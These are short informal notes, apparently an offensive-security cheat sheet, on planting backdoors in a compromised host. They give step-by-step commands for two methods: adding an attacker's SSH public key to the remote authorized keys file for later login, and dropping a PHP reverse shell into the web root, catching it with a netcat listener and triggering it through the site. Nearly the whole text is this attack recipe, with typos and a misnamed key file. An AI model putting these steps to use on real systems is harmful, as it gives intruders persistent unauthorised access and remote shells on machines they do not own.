Setting up back door


backdoor with ssh


put you ssh public key in the .ssh folder of remote machine 
  
    echo "your publickey" >> authorizedkey
  
give persmisson to file again 

    chmod 600 authorizedkey
 
 access with you private key to login to ssh
 
    chmod 600 id_rsa
   
now login 

    ssh -i id_rsa user@ip
    

backdoor with php-revershell

put you php-reverse-shell file to var/www/html


set up the reverse listner 

    nc -nvlp port
  
  
now access with the website to that file

    http://ip/php-reverse-shell
    
    
